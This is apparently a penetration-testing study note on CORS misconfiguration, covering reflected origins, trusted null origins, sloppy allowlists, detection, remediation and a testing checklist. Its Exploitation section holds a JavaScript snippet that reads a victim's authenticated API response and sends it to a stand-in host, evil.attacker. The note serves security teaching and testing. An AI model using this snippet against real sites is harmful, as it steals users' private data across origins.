---
type: technique
title: CORS Misconfiguration
lang: en
status: active
wstg: ["WSTG-CLNT-07"]
owasp_top10: ["A05:2021"]
owasp_api: []
asvs: ["V3.4.2"]
cwe: ["CWE-942"]
attack: []
cvss: ""
sources: [web-200-oswa]
updated: 2026-09-17
---

# CORS Misconfiguration

**TL;DR** — CORS relaxes the [[same-origin-policy]] so a page can read cross-origin
responses *when the server allows it*. If the server reflects the request `Origin` into
`Access-Control-Allow-Origin` (especially with `Access-Control-Allow-Credentials: true`) or
uses a sloppy allowlist, an attacker origin can read the victim's authenticated data.

> Framework: **A05:2021 – Security Misconfiguration**, `CWE-942` (permissive cross-domain
> policy). WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).

## Mechanics (what to look at)

- Browser sends `Origin:` on cross-origin requests.
- Server replies with `Access-Control-Allow-Origin` (ACAO) and optionally
  `Access-Control-Allow-Credentials: true` (ACAC).
- The browser only lets JS **read** the response if ACAO matches the origin (or `*`), and
  credentials are only usable if ACAC is `true` **and** ACAO is a specific origin (not `*`).

## Weak policies to test

1. **Reflected origin** — server copies whatever `Origin` you send into ACAO:

   ```http
   GET /api/me HTTP/1.1
   Origin: https://evil.attacker
   →
   Access-Control-Allow-Origin: https://evil.attacker
   Access-Control-Allow-Credentials: true          # jackpot: readable + credentialed
   ```
2. **`null` origin trusted** — some sandboxed/redirect contexts send `Origin: null`; if the
   server allows `null`, an attacker `<iframe sandbox>` qualifies.
3. **Sloppy allowlist** — substring/suffix/prefix checks: `target.com.evil.com`,
   `eviltarget.com`, or an unescaped `.` in a regex all slip past.

## Detection

Send crafted `Origin` values and watch ACAO/ACAC in the response. Reflection of an
arbitrary origin (with ACAC `true`) is the high-value finding.

## Exploitation

From an attacker origin, make a credentialed cross-origin request and read the response:

```js
fetch("https://target/api/me", {credentials:"include"})
  .then(r => r.text())
  .then(d => navigator.sendBeacon("https://evil.attacker/x", d)); // exfiltrate victim data
```

## Worked example — weak CORS policies (WEB-200 sandbox)

From [[web-200-oswa]] (module 7): the CORS sandbox demonstrates first a server that
**trusts any origin** by reflecting `Origin` into ACAO with credentials enabled — an
attacker page reads the authenticated response outright — and then an **improper domain
allowlist** whose matching logic accepts attacker-controlled look-alike origins. Same
outcome: cross-origin read of data that SOP was meant to protect.

### Adjacent pitfalls

- **Trusted subdomain + [[xss]]:** if any allowlisted subdomain has XSS or is
  takeover-able, its trust is inherited — the allowlist is only as strong as its weakest
  origin.
- **`postMessage`:** a separate cross-origin channel — flag handlers that don't validate
  `event.origin` (client-side data leak, cousin of CORS misconfig).

## Confirming impact

Demonstrate reading a sensitive authenticated endpoint (profile, API key, CSRF token) from
an unrelated origin. Reading a CSRF token this way can also unlock [[csrf]].

## Remediation

- Validate `Origin` against a **strict server-side allowlist** of exact origins; never
  reflect it blindly.
- Never combine `Access-Control-Allow-Credentials: true` with a wildcard or reflected ACAO.
- `Vary: Origin`; keep the allowlist minimal; prefer same-site architecture.

## Quick checklist

- [ ] Endpoint returns sensitive authenticated data and supports CORS?
- [ ] Send `Origin: https://evil` → is it **reflected** into `Access-Control-Allow-Origin`?
- [ ] Is `Access-Control-Allow-Credentials: true` set? (reflected origin + creds = jackpot)
- [ ] Test `Origin: null` and sloppy-allowlist look-alikes (`target.com.evil.com`, `eviltarget.com`).
- [ ] From an attacker origin, `fetch(...,{credentials:'include'})` and read the response → exfil. A leaked CSRF token unlocks [[csrf]].

## See also

[[same-origin-policy]] · [[csrf]] · [[samesite-cookies]] · [[xss]]

*Source: [[web-200-oswa]] module 7 (Cross-Origin Attacks — CORS).*
